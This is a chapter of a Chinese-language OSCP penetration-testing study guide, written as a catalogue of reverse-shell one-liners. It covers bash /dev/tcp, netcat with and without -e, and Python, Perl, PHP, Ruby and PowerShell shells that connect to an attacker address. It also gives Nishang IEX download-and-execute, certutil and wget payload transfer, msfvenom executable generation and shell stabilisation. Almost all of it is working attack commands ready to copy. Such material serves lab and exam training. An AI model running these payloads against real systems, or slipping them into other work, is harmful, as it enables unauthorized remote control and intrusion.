# Ch 19 — 反彈 Shell 技巧全集：各語言、各協定

> 目標：對任何可以執行程式碼的靶機，能快速找到合適的反彈 shell，並穩定化連線。

## 反彈 Shell vs 綁定 Shell

```
反彈 Shell（Reverse Shell）：
  靶機主動連你 → 你監聽
  適合：靶機在防火牆後面，外部不能直接連靶機

綁定 Shell（Bind Shell）：
  靶機在某個 port 開一個 shell → 你去連
  適合：你在靶機內網，但靶機能連你、你不能連靶機
```

**OSCP 99% 的時候用反彈 Shell。**

## 監聽設定

```bash
# 最基本：netcat 監聽
nc -nvlp 4444

# -n：不做 DNS 解析
# -v：verbose
# -l：listen mode
# -p：port

# 多次監聽（shell 斷掉後繼續等）
while true; do nc -nvlp 4444; done
```

## Linux 反彈 Shell

### Bash

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
# 或
/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
# 或（某些環境需要包 exec）
exec /bin/bash 0&0 2>&0
```

### Netcat

```bash
# 有 -e 參數的 nc（傳統版）
nc -e /bin/sh 10.10.14.5 4444
nc -e /bin/bash 10.10.14.5 4444

# 沒有 -e 的 nc（現代 Debian/Ubuntu 預設）
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

### Python

```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

### Perl

```bash
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP

```bash
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Windows 反彈 Shell

### PowerShell

```powershell
# 一行版本
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Invoke-PowerShellTcp（Nishang）

```powershell
# 先在 Kali 準備腳本
curl -O https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

# 在靶機上遠端載入並執行（需要能連到 Kali）
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444"
```

### Netcat（Windows 版）

```bash
# 先傳 nc.exe 到靶機
# 在 Kali：
python3 -m http.server 80
# 靶機（CMD）：
certutil -urlcache -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.5 4444
```

### msfvenom 生成 exe

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
# 傳到靶機後執行
```

## Shell 穩定化（複習）

```bash
# 1. 在靶機 shell 跑 Python pty
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 或
python -c 'import pty; pty.spawn("/bin/bash")'

# 2. Ctrl+Z 暫停，回 Kali
# 3. 在 Kali：
stty raw -echo; fg
# 4. 靶機 shell 裡：
export TERM=xterm
stty rows 50 columns 200
```

## 快速工具：RevShells.com

`revshells.com` 是反彈 shell 的線上生成器：

```
網站：revshells.com
用法：輸入你的 IP 和 port，選擇語言，複製 payload
```

**這個網站非常好用，考試中可以用（不是考試限制的工具）。**

## 上傳方式整理

當你有 RCE 但需要傳工具到靶機：

### Linux 靶機

```bash
# Kali 開 HTTP server
python3 -m http.server 80

# 靶機下載
wget http://10.10.14.5/linpeas.sh
curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh

# 沒有 wget/curl？
bash -c 'exec 5<>/dev/tcp/10.10.14.5/80; echo -e "GET /linpeas.sh HTTP/1.0\n" >&5; cat <&5 > /tmp/linpeas.sh'
```

### Windows 靶機

```cmd
# CMD
certutil -urlcache -f http://10.10.14.5/shell.exe C:\Windows\Temp\shell.exe

# PowerShell
Invoke-WebRequest -Uri http://10.10.14.5/shell.exe -OutFile C:\Windows\Temp\shell.exe
# 或簡短版
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Windows\Temp\nc.exe')
```

## 常見問題

### Shell 立刻斷線

→ 使用穩定的 shell（Python pty）
→ 確認 LHOST 是 tun0（VPN）IP，不是 eth0 或 lo

### 防火牆擋 4444

→ 試 port 80, 443（常被防火牆放行）
→ `nc -nvlp 80`（需要 sudo，因為 < 1024 port）

### 指令不回應但 shell 還在

→ stty 沒設好 → 重新穩定化

## 自我檢核

- [ ] 能快速說出 bash, python, nc 三種反彈 shell 的指令
- [ ] 知道 Linux 沒有 `-e` 的 nc 要用 mkfifo 版本
- [ ] 能在拿到 shell 後立刻做穩定化（Python pty + stty）
- [ ] 能在 Windows 靶機上用 PowerShell 下載並執行反彈 shell

→ [Ch 20 Linux 提權方法論：系統資訊收集清單](./20-linux-privesc-methodology.md)
